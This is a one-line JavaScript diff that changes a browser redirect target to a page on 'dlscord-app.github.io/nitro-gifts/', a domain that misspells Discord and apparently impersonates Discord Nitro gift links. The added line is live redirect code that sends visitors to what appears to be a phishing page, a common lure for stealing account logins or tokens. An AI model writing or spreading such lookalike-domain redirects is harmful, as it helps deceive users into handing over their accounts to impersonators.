@@ -1,1 +1,1 @@
-window.location.href = "https://dlscord-app.github.io/nitro-gifts/j438f2jbs3.html";
+window.location.href = "https://dlscord-app.github.io/nitro-gifts/gjslk3h7ch19fnal3f8f21.html";
